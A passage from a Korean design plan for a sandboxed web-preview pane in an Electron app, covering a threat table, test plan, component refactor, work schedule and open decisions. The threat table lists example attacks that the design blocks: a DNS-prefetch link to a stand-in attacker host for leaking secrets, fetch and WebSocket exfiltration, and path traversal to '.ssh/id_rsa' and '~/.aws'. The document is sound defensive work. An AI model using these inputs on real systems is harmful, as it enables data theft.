- 기존 `assertCurrentMainFrame`(`main.ts:281`)이 `event.sender !== mainWindow.webContents`를 거절하므로, 미리보기가 어떤 방법으로든 IPC를 보내도 막힙니다. 새 `m5:preview:v1` 핸들러도 같은 검사를 거칩니다.
- 앱 창의 CSP(`src/m5/index.html`)와 `frame-ancestors 'none'`은 **바꾸지 않습니다.** iframe을 쓰지 않기 때문입니다.

### 2.4 위협과 대응

★ = 독립 검토 필수 지점. "확인"은 자동 시험으로 확인할 방법입니다.

| # | 위협 | 예 | 대응 | 확인 | 남는 위험 |
| --- | --- | --- | --- | --- | --- |
| T1★ | 인터넷으로 내보내기(유출) | 만든 코드가 `fetch("https://…")`, `<img src=외부>`, `navigator.sendBeacon`, WebSocket으로 작업 공간 내용을 보냄 | webRequest 전체 취소 + 무효 프록시 + CSP `connect-src/img-src 'self'` | 시험 페이지가 위 방법을 다 시도하고, 127.0.0.1 수집 서버와 외부 수집 서버 접속 수가 0인지 확인 | 없음(3중) |
| T2★ | WebRTC로 우회 | `RTCPeerConnection` + STUN UDP는 webRequest를 거치지 않음 | `setWebRTCIPHandlingPolicy("disable_non_proxied_udp")` + 무효 프록시 + 권한 거절 | 시험 페이지의 STUN 요청을 로컬 UDP 수집기로 받는지 확인(0건) | Chromium 정책 변경 시 회귀 가능 → Electron 올릴 때 이 시험을 다시 돌림 |
| T3★ | DNS 미리 찾기로 새는 정보 | `<link rel=dns-prefetch href=//비밀.attacker.tld>`가 프록시 없이 DNS 질의를 보낼 수 있음 | 프록시 고정 모드에서는 요청 DNS를 프록시에 맡김. prefetch/preconnect는 webRequest 취소 대상. **Chromium의 투기적 DNS는 확인 필요** | 고유 호스트명 prefetch 뒤 로컬 DNS 로그(또는 `scutil`/`dns-sd` 관측)에 질의가 없는지 확인 | 확인 전까지 미해결. 막을 수 없으면 앱 전체 `--dns-prefetch-disable` 스위치(앱 다른 부분 영향 검토)를 쓰거나 위험을 수용할지 판단 |
| T4★ | 작업 공간 밖 파일 읽기 | `../../.ssh/id_rsa`, `%2e%2e`, 절대 경로, 작업 공간 안 심볼릭 링크 → `~/.aws` | sidecar 경로 검증, 조각별 심볼릭 링크 거절, `O_NOFOLLOW`, 실제 경로 재확인 | Rust 단위 시험: 이탈 경로·인코딩·링크(파일/폴더/연쇄)·하드링크·바꿔치기(TOCTOU) | 하드링크는 작업 공간 안 파일로 취급됩니다(내용 노출은 화면 표시뿐이고 T1로 유출 불가) |
| T5 | 작업 공간 안 비밀 파일 노출 | 그림자 git 작업 공간의 `.env`, `.git/config`의 토큰 | 점 파일·점 폴더 전체 거절. 확장자 허용 목록에 `env`, `pem`, `key` 없음 | 시험: `.env`, `.git/HEAD`, `a/.secret/x.js` 모두 404 | `config.json`처럼 점 없이 비밀을 담은 파일은 읽힐 수 있음. 화면에만 보이고 T1로 밖에 못 나감 |
| T6★ | 앱 권한 획득 | 페이지가 `ipcRenderer`나 `window.m5*` 브리지에 접근 | 별도 프로세스, sandbox, preload 없음, contextIsolation, main 핸들러의 보낸 쪽 검사 | 시험 페이지에서 `typeof window.m5Projects === "undefined"`, `require` 없음. main 핸들러에 미리보기 webContents를 보낸 쪽으로 위조한 단위 시험 | Chromium/Electron 샌드박스 탈출 취약점 → Electron을 최신으로 유지 |
| T7 | 원본·작업 공간 변경 | 페이지가 파일을 쓰거나 지움 | 쓰기 API 없음, GET/HEAD만, `form-action 'none'`, File System Access 권한 거절, 다운로드 차단 | 시험: POST/PUT 405, `showSaveFilePicker` 거절, `<a download>` 차단, 실행 전후 작업 공간 해시 동일 | 없음 |
| T8 | 앱 화면 흉내(속이기) | 페이지가 "로그인이 필요해요" 앱 대화상자처럼 그려 비밀번호를 받음 | 미리보기 둘레에 앱이 그리는 틀("미리보기 — 팀이 만든 결과", "읽기 전용", "인터넷 차단")을 둠. 입력해도 밖으로 못 나감(T1) | 화면 검토 | 사용자가 속아 입력할 수는 있지만 유출 경로가 없음 |
| T9 | 탐색·새 창 이탈 | `location = "https://…"`, `window.open`, `target=_blank`, 메타 새로고침, iframe 안 외부 주소 | `will-navigate/redirect/frame-navigate` 거절, 창 열기 거절, CSP `frame-src 'self'` | 시험: 각 방법 뒤 URL이 그대로인지 확인 | 없음 |
| T10 | 권한 요청 | 카메라·마이크·위치·알림·클립보드 읽기·HID/USB/시리얼·전체 화면 | 세션 권한 처리기 전부 거절 + Permissions-Policy | 시험: 각 API가 거절되는지 확인 | 없음 |
| T11 | 자원 고갈 | 무한 루프, 메모리 폭주, `alert` 폭탄, 거대한 파일 | 별도 renderer 프로세스, `unresponsive` → "멈췄어요" + 닫기, `safeDialogs`, 크기·요청 수 한도 | 시험: `while(true)` 페이지에서 앱 입력 지연이 G6 기준 안인지, 닫기 버튼으로 회복되는지 확인 | 일시적 CPU 사용. 사용자가 닫을 수 있음 |
| T12 | 작업 사이 데이터 섞임·남음 | 작업 A의 localStorage를 작업 B 미리보기가 읽음. 종료 뒤 디스크에 남음 | 작업마다 다른 토큰·partition·출처, 메모리 전용, 닫을 때 지우기 | 시험: A에서 쓴 키가 B에서 없음. 앱 데이터 폴더에 `Partitions/preview-*`가 생기지 않음 | 없음 |
| T13 | 서비스 워커·캐시로 남기 | 서비스 워커가 다음 열기 때 응답을 바꿈 | 스킴 `allowServiceWorkers: false`, `Cache-Control: no-store`, 메모리 partition | 시험: `navigator.serviceWorker.register` 실패 | 없음 |
| T14★ | 미리보기 스킴이 앱 쪽에 열림 | 앱 창이나 다른 session에서 `elsecrew-preview://` 로드 | 핸들러는 미리보기 session에만 등록. 앱 창 `isAllowedNavigation`(`main.ts:262`)은 그대로 | 시험: 기본 session에서 해당 URL이 실패하는지 확인 | 없음 |
| T15★ | 토큰 추측·재사용 | 다른 작업의 토큰을 맞혀 그 작업 파일 읽기 | 128bit 무작위, main 메모리 표에만 둠, 닫으면 폐기, URL 호스트=토큰이 핸들러를 부른 session의 토큰과 같아야 함 | 단위 시험: 다른 session/폐기된 토큰 요청은 404 | 없음 |
| T16 | 겹침으로 생기는 오해 | 대화상자 위에 미리보기가 올라와 '허용' 버튼을 가림 | 1.3·2.3의 `previewObscured`로 숨김 + 정지 이미지 | UI 시험: 대화상자·시트·서랍·알림을 열 때 view가 숨는지 확인 | 겹침 원인 목록이 빠지면 생길 수 있음 → 원인은 한 곳에서 관리 |
| T17 | 인쇄·대화상자 | `window.print()`, `alert` 반복 | `safeDialogs`. 인쇄 대화상자는 시스템 창일 뿐 쓰기·전송 경로가 아님 | — | 인쇄 창이 뜰 수는 있음(수용) |

### 2.5 독립 검토가 필요한 지점

CLAUDE.md 기준으로 **권한·원본 보호·종료/복구 경계 변경**이 모두 들어가므로, 상시 승인된 독립 검토자 1명을 구현 뒤(P4) 반드시 부릅니다. 검토 범위는 다음입니다.

1. `registerSchemesAsPrivileged` 추가 항목과 미리보기 session 전용 `protocol.handle`. 앱 창 탐색 허용 목록에 변화가 없는지 확인합니다(T14).
2. sidecar `preview.readAsset`의 경로 검증·심볼릭 링크·점 파일·크기 한도. 작업 공간 식별자 결속과, renderer 값을 쓰지 않는지 확인합니다(T4·T5·T15).
3. 네트워크 차단 완결성: webRequest·프록시·WebRTC 정책·CSP 조합과 DNS 미리 찾기 확인 결과(T1~T3).
4. WebContentsView 수명: 작업 전환·종료 조정자(`quit-coordinator.ts`)·`render-process-gone` 처리와 G6 예산 영향.
5. 새 IPC `m5:preview:v1`의 보낸 쪽 검사와 입력 검증(bounds·토큰을 renderer가 지정할 수 없음).
6. 미리보기가 앱 CSP·`frame-ancestors`·`will-attach-webview` 막기를 **풀지 않았는지** 확인하는 회귀 점검.

검토 결과는 자동 합격이 아닙니다. 차단·중요 지적을 닫은 뒤에만 기능을 기본으로 켭니다. 그 전까지는 설정 플래그(`ELSECREW_PREVIEW=1`) 뒤에 둡니다.

### 2.6 시험 계획

- **Rust 단위**: `preview.readAsset` 경로 표(정상·이탈·인코딩·링크·점 파일·크기·확장자·버린 작업 공간), `preview.resolve` 후보 순서
- **TS 순수 함수 단위**(`node --test`)
  - URL 해석과 토큰 확인
  - 확장자 → MIME 표
  - CSP·헤더 문자열 스냅샷
  - bounds 검증
  - `previewObscured` 계산(시트·서랍·대화상자·팝오버 조합)
- **Electron 통합 프로브**(`scripts/m5-preview-isolation-probe.mjs`, 개발 빌드)
  - 시험용 임시 작업 공간에 `leak.html`을 둡니다. 이 페이지는 T1·T2·T6·T7·T9·T10·T12·T13의 모든 시도를 하고 결과를 화면에 씁니다.
  - 프로브는 다음 세 가지로 판정합니다.
    - 127.0.0.1의 HTTP·WebSocket·UDP 수집기 접속 0건
    - main 로그의 차단 기록 수
    - 페이지가 쓴 결과
  - 외부 인터넷은 쓰지 않습니다. 수집기는 로컬이며, 외부 호스트는 프록시와 webRequest에서 막혔는지로 판정합니다.
- **DNS 확인(T3)**: 수동 1회 시험으로, 고유 호스트 prefetch 뒤 macOS `log stream --predicate 'process == "mDNSResponder"'`에서 해당 이름을 찾습니다. 결과는 history에 기록합니다.
- **G6 영향**: 미리보기를 닫은 유휴 상태와 todo 앱 미리보기를 연 상태에서 메모리를 측정합니다. 기존 G6 측정 스크립트에 단계 하나를 추가합니다.

---

## 3. 구현 계획

### 3.1 컴포넌트별 처리

표기: **유지**(그대로 씀) · **이동**(위치만 바뀜) · **분해**(나눠서 새 컴포넌트로) · **신규** · **삭제**

| 지금 (파일:줄) | 처리 | 새 위치·이름 | 비고 |
| --- | --- | --- | --- |
| `WorkbenchDock` (`workbench-dock.tsx`) | **삭제** | `TaskLayout` 신규(`src/m5/task-layout.tsx`) | 3영역 + 구간 규칙 + 서랍·시트·레일. 안정된 부모로 Monaco를 지키는 원칙은 시트로 옮김 |
| `dock-layout.ts` 전체, `tests/m5-dock-layout.test.mts` | **삭제** | `task-layout-model.ts` 신규(구간 계산, 오른쪽 폭 고정, 기본 탭 결정, `previewObscured`) + 새 테스트 | `DOCK_STORAGE_KEY`는 원래 쓰이지 않음 |
| `ProjectCatalog rail` (`workbench.tsx:523`) + `m5-sidebar-reopen` | **이동** | 왼쪽 위 `ProjectSwitcher`(팝오버 안에서 기존 `ProjectCatalog rail` 목록 재사용) | `home`·`management` 모드는 그대로. 전환 동작 불변 |
| 상단 `m5-toolbar` (`:532`) | **분해** | `TopBar`: 프로젝트 › 작업 이동 경로, 작업 경과, `NotificationBell`, 도움말, 1100px 미만 서랍 토글 | `ProjectGuide`(:560)는 상단 막대 아래 띠로 유지 |
| 작업 목록 `chats` 블록 (`:667~679`) | **분해** | `TaskList`(`task-list.tsx`): 상태 묶음, 접힘, 레일 모드, ⋯ 메뉴(지우기) | 상태→묶음 함수는 1차-가 상태 기계에서 import |
| `TeamTimeline` (`:1213~1303`) | **분해** | `TaskStory`(가운데 열) = `TaskHeader` + `StageBar` + `MemberCard[]` + 고정 `ApprovalCard` + `FollowupComposer` | 복구·오류 알림, 200개 메시지 페이지 이동, 새 메시지 버튼은 `TaskStory`가 유지 |
| `TeamProgress` (`:1183`) | **삭제(흡수)** | `StageBar`의 '지금' 칸, 실행 사이 "총괄이 정하는 중" 칸 | |
| `TeamMessageRow` (`:1199`) + `AgentRuns` 카드(`:1329`) | **합침** | `MemberCard`(`member-card.tsx`): runId로 보고 + 실행 결합. runId 없는 메시지(사용자 추가 요청, 상태)는 `UserBubble` 또는 생략 | 실행 ID·종료·진단은 `HistoryTab`으로 |
| `AgentOutputPanel` (`agent-output-panel.tsx`) | **이동** | 지금 실행 중인 `MemberCard` 안 | 내부(한국어 동사 등)는 1차-가 소유 |
| `ApprovalCard` (`approval-card.tsx`) | **이동** | 대기 중이면 입력칸 위 고정 영역. 끝나면 해당 카드 아래 기록 | 카드 내용은 1차-가(D13) |
| `FollowupComposer` (`:1160`) | **이동** | 가운데 바닥 | 안내 문구만 변경 |
| fixture demo 컨트롤, legacy V1 안내 (`TeamTimeline` 바닥) | **이동** | `HistoryTab` 아래 "개발용" 접힘 | fixture 가능할 때만 |
| `m5-first-chat` (작업 없을 때, `:658`) | **이동** | 가운데 빈 상태(목표 예시 버튼 유지) | |
| 결과 막대 `m5-result-bar` (`:643~664`) | **이동·통합** | `ResultBox`(`result-box.tsx`) — 오른쪽 바닥 | `ChatWorkspaceMerge`, `ChatWorkspaceDiscard`, 사본 반영 fallback을 그대로 품음 |
| `ChangesMergeStatus` (변경 패널) | **유지(버튼 제거)** | 변경 탭 상태 문장 | "합치기" 버튼은 지우고 `ResultBox`로 초점 이동 링크만 |
| `ApplyLatest` (변경 패널, `apply-latest.tsx`) | **이동** | `ResultBox` 안(사본 작업) | 확인 대화상자·`confirmRequest`·`onStanding` 계약 불변 |
| 파일 aside `m5-files` (`:681~698`) | **이동** | 오른쪽 '파일' 탭 | 파일 열기 → 시트(편집기) |
| 편집기 section `m5-editor` (`:700~750`) | **이동** | `ReviewSheet`(`review-sheet.tsx`)의 편집기 모드 | 한 번 연 뒤 hidden만 토글 |
| `AllChanges`, `DiffDetails`, `MonacoDiff` | **이동** | `ReviewSheet`의 바뀐 내용 모드 | 왼쪽 파일 목록은 `ChangeList` 재사용 |
| 변경 aside `m5-changes` (`:753~768`) | **이동** | 오른쪽 '변경' 탭 | |
| `editor-state.ts`의 `selectPanel`/`panelRequest`(`"files"|"editor"|"changes"`) | **유지 + 어댑터** | `TaskLayout`이 `editor` → 시트 열기, `changes` → 변경 탭, `files` → 파일 탭으로 해석 | 1,285줄 컨트롤러는 건드리지 않음 |
| 미리보기 | **신규** | renderer `PreviewTab`(`preview-tab.tsx`), `contracts/preview-v1.ts`, preload `m5Preview`, `electron/preview-view.ts`(PreviewManager), `electron/preview-protocol.ts`, `ipc-channels.ts` 항목, Rust `preview.resolve`/`preview.readAsset`(sidecar + protocol) | 2장 |
| `HistoryTab` | **신규** | 오른쪽 '기록' 탭 | `AgentRuns`의 이전 실행·세부·`SessionDiagnosticsHelp` 재사용 |
| `styles.css`(1,401줄) 중 dock·panel·timeline·result-bar 구역 | **다시 씀** | `task-layout.css`처럼 파일을 나누지 않고 같은 파일의 구역 교체 | 3.5 토큰 |
| 레이아웃 CSS 선택자에 묶인 시험·스모크 | **수정** | `data-testid`/`aria` 기반으로 바꿈 | 의존 수: `tests/m5-renderer-smoke-runner.cjs` 30, `scripts/m5-project-ui-smoke.cjs` 20, `tests/m5-ui-capture.cjs` 5, `scripts/m5-packaged-diff-probe.mjs` 4(`.m5-dock-group-tabs`), `tests/m5-renderer-performance-runner.cjs` 3, `tests/m5-diff-followup-probe.cjs` 1 |

### 3.2 작업 묶음

순서는 L0 → L1 → (L2, L3) → L4a → L4b → L5 → L6이고, 미리보기 트랙 P1 → P2 → P3 → P4는 **L1 뒤에 별도 작성자가 병렬로** 할 수 있습니다(파일이 거의 겹치지 않음: `electron/`, `crates/`, `contracts/`, `preview-tab.tsx`). 병렬 작성은 CLAUDE.md의 위임 승인 대상입니다.

| 묶음 | 크기 | 내용 | 완료 기준 | 시험 |
| --- | --- | --- | --- | --- |
| **L0 토큰 골격** | 1~1.5일 | `:root`를 원시 → 의미 2단 토큰으로 재구성(다크 값만). `--m5-*` 기존 이름은 의미 토큰 별칭으로 남겨 한 번에 안 깨지게. 상태 색 토큰을 1차-가의 상태 이름과 맞춤 | 기존 화면 픽셀 차이 없음(별칭). 새 토큰 문서화 | `pnpm build`, `tests/m5-ui-capture.cjs` 전후 캡처 비교 |
| **L1 3영역 골격** | 2~3일 | `TaskLayout` + `task-layout-model.ts`. 기존 블록을 **내용 변경 없이** 왼쪽(작업 목록·프로젝트)·가운데(`TeamTimeline`+결과 막대+입력칸)·오른쪽(파일·변경 탭)·시트(편집기)에 꽂음. `WorkbenchDock`/`dock-layout` 삭제. `panelRequest` 어댑터. 레이아웃 선택자 시험을 `data-testid`로 전환. **첫 커밋은 JSX 블록을 새 파일로 옮기기만 하는 기계적 이동**(충돌 해결을 쉽게) | 모든 기존 기능에 닿을 수 있음(파일 열기·저장·diff·합치기·반영·버리기·권한 허용). 1280×768에서 가운데 열 ≥640px·≥600px. 편집 초안이 시트 열고 닫기·작업 전환에서 유지 | 새 `task-layout-model` 단위, `npm test`, `pnpm build`, 렌더러 스모크(선택자 갱신 후), 편집기 입력 프로브(`scripts/m5-editor-input-probe.mjs`) |
| **L2 넓은 검토 시트** | 1.5~2일 | `ReviewSheet`: 바뀐 내용/편집기 전환, 파일 목록, Esc·초점 복귀·`inert`, 미저장 표시. 변경 탭·파일 탭·카드 칩에서 여는 경로 | 시트에서 diff와 편집이 지금과 같게 동작. 저장 안 한 초안 유지. 키보드만으로 열고 닫기 | 단위(시트 상태), `tests/m5-diff-followup-probe.cjs`, 편집기 프로브 |
| **L3 상태별 작업 목록** | 1~2일 | `TaskList` 묶음·접힘·빈 묶음 숨김·⋯ 메뉴·레일 모드. `ProjectSwitcher` | 진단의 5상태(진행 중/검토 대기/합침/반영/반영 뒤 또 바뀜)가 올바른 묶음에 들어감. 1차-가 상태와 항상 일치 | 상태→묶음 함수 단위 시험(전 상태 표), 스모크 |
| **L4a 머리말·단계 막대** | 1.5일 | `TaskHeader`, `StageBar`(실행 순서·지금·다음 칸·실행 사이 이유·접기), `TeamProgress` 삭제 | 진행 중 어느 시점에도 '지금' 또는 '총괄이 정하는 중' 칸이 있음(10초 공백 없음) | 실행 배열 → 칸 계산 단위(대기·실행·사이·실패·취소·복구) |
| **L4b 팀원 카드** | 2~3일 | `MemberCard`(보고+실행 결합, 요약/자세히, 실시간 활동 펼침), 확인 카드 고정, 사용자 추가 요청 말풍선, 실행 ID·종료 정보를 카드에서 제거. 바뀐 파일 칩: renderer에 실행별 파일 목록이 있는지 확인. **없으면 칩은 빼고 1차를 마감**하고, 2차 F4("이 단계 되돌리기")와 함께 sidecar 계약 추가 | 같은 메시지가 두 번 이상 보이지 않음. 확인 요청이 스크롤과 상관없이 보임. 실행 ID가 기본 화면에 없음 | 결합 함수 단위(runId 있음/없음/고아 메시지), 스모크, 1280 캡처 |
| **L5 오른쪽 탭·결과 상자·기록** | 2일 | 탭 4개, `ResultBox`(합치기·반영·버리기 단일 위치), `ChangesMergeStatus` 버튼 제거, `ApplyLatest` 이동, `HistoryTab`, 오른쪽 폭 끌기·저장, 미리보기 자리(빈 상태) | 합치기·반영 버튼이 화면 전체에서 1곳. git/사본 3상태가 결과 상자·변경 탭·목록에서 같은 말 | 스모크(합치기 확인 → 합침), `chat-workspace-merge`/`apply-latest` 기존 단위 |
| **L6 좁은 창** | 1~2일 | 1100px 미만 레일·서랍·상단 토글, 820px 미만 규칙, 서랍 열림이 `previewObscured`에 포함 | 960·1024·1100·1280·1680에서 글자 세로 깨짐 없음(D8). 640 최소 폭에서 기능 접근 가능 | 구간 계산 단위, 5개 폭 캡처 |
| **P1 미리보기 계약·sidecar** ★ | 2~3일 | `preview.resolve`, `preview.readAsset`(Rust·protocol·TS 계약·sidecar client) | 2.3 규칙 모두 구현 | Rust 경로 표 시험, protocol fixture, `pnpm m5:test:core`(`CARGO_BUILD_JOBS=4 RUST_TEST_THREADS=4`) |
| **P2 미리보기 세션·뷰** ★ | 2~3일 | `PreviewManager`, 메모리 partition, 프로토콜 핸들러, 차단·권한·탐색·헤더, 수명·종료 조정자, IPC `m5:preview:v1`, preload `m5Preview` | 2.3 설정 목록 모두 적용, 플래그 뒤 | TS 순수 함수 단위, 보낸 쪽 위조 단위, 종료 중 열기 경합 단위 |
| **P3 미리보기 화면** | 1~2일 | `PreviewTab`: bounds 동기화, 넓게/좁게, 다시 불러오기, 새 결과 띠, 멈춤 화면, 비웹 빈 상태, 정지 이미지 겹침 처리, 파일 탭 "미리보기로 열기" | todo 앱을 넓게·좁게 볼 수 있음(1차 완료 기준). 시트·서랍·대화상자·알림을 열 때 미리보기가 위로 올라오지 않음 | `previewObscured` 단위, UI 캡처 |
| **P4 안전 시험·독립 검토** ★ | 1~2일 | `m5-preview-isolation-probe.mjs`, DNS 수동 확인, G6 측정 한 단계, 독립 검토 1회 + 수정 재검토 | 2.4의 확인 열 전부 통과, 검토 차단·중요 0 | 프로브 JSON 증거를 하네스에 연결 |
| **V 통합 검증** | 1.5~2일 | 1차 완료 기준 6개를 todo 시나리오로 측정(1차-가 항목 포함), 캡처, history 기록 | 4장 1차 완료 기준 전부 충족 | `pnpm test:harness`, 실제 todo 시나리오(실제 계정 시험은 별도 승인) |

- 합계는 L 트랙 약 13~17일, P 트랙 약 6~10일, V 약 2일입니다. **혼자 순서대로 하면 약 4~5.5주**, P 트랙을 병렬로 맡기면 약 3~3.5주입니다. 진단 보고서의 1차 3~4주는 1차-가를 포함한 추정이었으므로, 이 계획 기준으로는 **1차 전체가 4주를 넘을 가능성이 큽니다**(Q8).
- 각 묶음은 지금 규칙(구현 우선·최종 통합 검증)에 따라 "필요한 컴파일·진단만" 하고 로컬 커밋 체크포인트를 남깁니다. ★ 묶음은 안전 경계라 P4에서 독립 검토로 묶습니다.

### 3.3 1차-가와의 의존 (1차-나가 받아 쓰는 것)

| 1차-가 산출물 | 1차-나 사용처 | 없으면 |
| --- | --- | --- |
| 작업 상태 기계(단일 값: 진행/확인 필요/검토 대기/합침/반영/반영 뒤 또 바뀜/버림 + 전환 중) | `TaskList` 묶음, 상태 배지, `ResultBox`, 스켈레톤 | L3·L5를 시작할 수 없음 → 1차-가 머지가 L3 시작 조건 |
| 메시지 렌더러 + 요약/자세히 규칙 | `MemberCard` 본문 | L4b에서 임시로 원문을 쓰면 D2 회귀 → 1차-가 머지가 L4b 시작 조건 |
| 활동 줄 한국어 동사 | 실행 중 카드 | 영어 원문이 보임(기능은 됨) |
| 확인 카드 요청 내용·사라진 요청 처리(D13) | 고정 확인 영역 | 고정해도 내용이 빔 |
| 비개발자 문구(D9) | 결과 상자·변경 탭 문장 | 문구만 다름 |

### 3.4 1차-가와 충돌할 지점 (같은 파일)

| 파일 | 1차-가가 바꿀 것(추정) | 1차-나가 바꿀 것 | 충돌 정도 | 대응 |
| --- | --- | --- | --- | --- |
| `src/m5/workbench.tsx` (1,716줄) | 상태 표시 통일(결과 막대·목록 상태), 메시지 행·실행 카드 문구, 실행 ID 숨김, 설정 거짓 미저장(D12, `RoleSettings`), 전환 깜박임 | JSX 대부분을 새 파일로 이동, `TeamTimeline`/`AgentRuns`/결과 막대/목록 분해 | **매우 높음** | 1차-가 머지 뒤 시작. L1 첫 커밋은 기계적 이동만. 1차-가 쪽에 "새 로직은 가능하면 별도 파일 함수로, JSX 구조 재배치는 하지 말 것"을 요청(조정자 경유) |
| `src/m5/styles.css` (1,401줄) | 상태 색·메시지 렌더 스타일·배지 | 레이아웃·패널·타임라인 구역 재작성, 토큰 | **높음** | L0에서 1차-가가 추가한 색을 의미 토큰으로 흡수. 1차-가가 새 스타일을 파일 끝 별도 구역에 두면 충돌이 줄어듦 |
| `src/locales/ko.ts`, `en.ts` | 문구 정리(D9 등) 대량 수정 | 새 키(탭·묶음·시트·미리보기·결과 상자) 추가, dock 키 삭제 | 중간 | 새 키는 `m5.layout.*`, `m5.preview.*` 접두어로 파일 끝에 모음. dock 키 삭제는 마지막 묶음에서 |
| `src/m5/approval-card.tsx` | D13 내용 표시, 사라진 요청 | 위치만(부모가 바뀜) | 낮음 | 파일 자체는 건드리지 않음 |
| `src/m5/agent-output-panel.tsx` | 한국어 동사, 중복 줄 | 위치만 | 낮음 | 건드리지 않음 |
| `src/m5/chat-workspace-merge.tsx`, `apply-latest.tsx`, `changes-view.tsx` | D3 상태 오표시(진행 중 "합쳐짐") 수정 | 버튼 위치 통합(`ResultBox`), `ChangesMergeStatus` 버튼 제거 | **중간~높음** | 1차-가 머지 뒤 L5. 컴포넌트 내부 계약(`onState`, `confirmRequest`, `onStanding`)은 그대로 쓰고 부모만 바꿈 |
| `src/m5/work-status*.ts`, `chat-state.ts` | 상태 기계 | 읽기만 | 낮음 | 수정하지 않음 |
| `src/m5/message-body.tsx`, `orchestration-message-body.tsx`, `message-blocks.ts` | 렌더러 | 읽기만 | 없음 | — |
| `src/m5/editor-state.ts` | F13(마지막 작업 복원)을 1차-가가 맡으면 일부 | `panelRequest` 해석만 레이아웃에서(파일 수정 최소) | 낮음 | 어댑터는 `TaskLayout`에 둠 |
| `tests/m5-renderer-smoke-runner.cjs`, `scripts/m5-project-ui-smoke.cjs` 등 | 문구 바뀐 선택자 갱신 | 레이아웃 선택자 갱신 | 중간 | L1에서 `data-testid`로 바꿔 이후 문구 변경에 덜 흔들리게 |
| `docs/history.md`, `docs/architecture.md` | 각자 기록 | 각자 기록 | 낮음 | 통합 시 엔트리 모두 보존(규칙) |

### 3.5 색·간격 토큰 정리 범위

**추천: 지금(1차) 토큰 구조를 잡고 다크 값만 채운다. 라이트 값·테마 선택은 2차.**

- 이유:
  - 1차-나가 `styles.css`의 레이아웃·패널·타임라인 구역을 어차피 다시 씁니다. 그때 새 코드가 하드코딩 색을 쓰면 2차에 같은 줄을 또 고쳐야 합니다.
  - 지금 `styles.css`에는 고유 hex 색이 **163개**, hex가 들어간 줄이 **222줄**이고, `:root` 토큰은 13개뿐입니다. 예: `.m5-provider-install`의 `#3a414d`, `#202630`, `#64799f`. 1차-가도 상태 색을 추가하므로, 상태 색 토큰 이름을 지금 함께 정해야 2차 라이트 테마에서 상태 색이 한 곳에서 바뀝니다.
- 1차 범위:
  1. 2단 구조(원시 `--p-*` → 의미 `--bg-* --line-* --text-* --action-* --status-* --diff-*`)와 간격 `--space-1~6`, 모서리 `--radius-s/m/l`, 글자 `--text-xs~xl`, 레이아웃 치수 변수(목업 `:root` 그대로)를 둡니다.
  2. 기존 `--m5-bg` 등 13개는 의미 토큰의 별칭으로 유지합니다(L0에서 화면 변화 0).
  3. **1차-나가 새로 쓰거나 다시 쓰는 구역은 의미 토큰만** 씁니다. lint 대신 리뷰 규칙으로 지킵니다.
  4. 상태 색 5종(running/attention/review/done/danger)은 1차-가와 이름을 맞춥니다(조정자 경유).
  5. 테마 선택은 만들지 않습니다. 다만 `:root[data-theme="light"]` 블록이 들어갈 자리와 `color-scheme` 처리 위치만 주석으로 둡니다.
- 2차 범위: 1차-나가 건드리지 않은 나머지 구역(설정·설치·로그인·복구 화면 등)의 hex를 의미 토큰으로 바꾸는 일괄 작업, 라이트 값, 시스템/라이트/다크 3택(D7), diff 색 다듬기, 대비 4.5:1 점검.

---

## 4. 열린 질문 (주인님 결정 사항)

| # | 질문 | 선택지 | 추천 |
| --- | --- | --- | --- |
| Q1 | 미리보기에서 **자바스크립트 실행**을 허용할까요? | (가) 허용 — 인터넷·앱·파일 쓰기는 모두 막힌 격리 세션 안에서만 / (나) HTML·CSS만(스크립트 끔) | **(가)**. 끄면 todo 앱이 화면만 보이고 추가·체크가 안 돼 1차 완료 기준("만든 todo 앱 화면을 넓게·좁게")의 의미가 약해집니다. 위험은 2.4의 격리로 다룹니다. |
| Q2 | 미리보기 안에 저장된 데이터(예: todo 목록의 localStorage)를 **얼마나 유지**할까요? | (가) 미리보기를 열어 둔 동안만, 작업을 바꾸거나 앱을 끄면 지움 / (나) 작업별로 앱 데이터에 계속 저장 | **(가)**. 디스크에 남는 것이 없고 작업 사이에 섞이지 않습니다. 단점은 다른 작업에 다녀오면 미리보기 속 todo 목록이 비어 있는 것입니다. 안내 문구로 알립니다. |
| Q3 | 1차 미리보기 **대상 범위** | (가) 작업 공간의 정적 파일(`index.html` 등)만 / (나) `npm run dev` 같은 개발 서버 실행까지 | **(가)**. 개발 서버는 명령 실행과 로컬 포트가 필요해 별도 안전 결정입니다. 2차 이후 따로 다룹니다. |
| Q4 | 편집기·diff를 어디에 둘까요? | (가) 필요할 때 여는 **넓은 검토 시트**(목업) / (나) 오른쪽 패널 안 탭 / (다) 별도 창 | **(가)**. (나)는 400px에서 diff를 읽기 어렵고, (다)는 비개발자에게 창 관리 부담이 큽니다. |
| Q5 | 합치기·반영 버튼의 **단일 위치** | (가) 오른쪽 패널 바닥 결과 상자(탭과 무관하게 늘 보임) / (나) 가운데 흐름 끝의 완료 카드 | **(가)**. 결과(미리보기·변경)를 보면서 바로 넣을 수 있고, 가운데 흐름은 이야기 전용으로 남습니다. 가운데 완료 카드에는 "오른쪽에서 확인해 주세요" 안내만 둡니다. |
| Q6 | 단계 진행 막대에 **무엇을** 보여 줄까요? (구조화된 계획 F3은 2차) | (가) 실제로 지나간 실행 순서 + "다음 · 총괄이 정해요" / (나) 고정 4칸(계획·개발·검증·정리)에 실행을 끼워 맞춤 | **(가)**. (나)는 총괄이 단계를 건너뛰거나(이번 todo처럼 기획·디자인 생략) 되돌아갈 때 실제와 다른 칸이 보입니다. 2차에 계획이 구조화되면 앞으로 할 칸을 점선으로 미리 그립니다. |
| Q7 | 1100px 미만 반응형(D8, 원래 2차)을 **1차에 넣을까요?** | (가) 1차 L6에 기본 규칙(레일·서랍)만 넣음(+1~2일) / (나) 2차로 미룸 | **(가)**. 레이아웃을 다시 짜는 지금 함께 하는 것이 가장 쌉니다. 미루면 960px에서 3영역이 다시 깨집니다. 2차에는 다듬기만 남습니다. |
| Q8 | 일정과 인력: 이 계획은 혼자 순서대로 하면 **약 4~5.5주**입니다(진단 추정 3~4주는 1차-가 포함). | (가) 미리보기 트랙(P1~P4)을 L1 뒤 별도 작성자 1명에게 병렬로 맡김(약 3~3.5주, 위임 승인 필요) / (나) 혼자 순서대로 / (다) 미리보기를 1차에서 빼고 1.5차로 | **(가)**. 파일이 거의 겹치지 않아 병렬 효율이 좋습니다. 안전 경계라 독립 검토는 어느 쪽이든 필요합니다. |
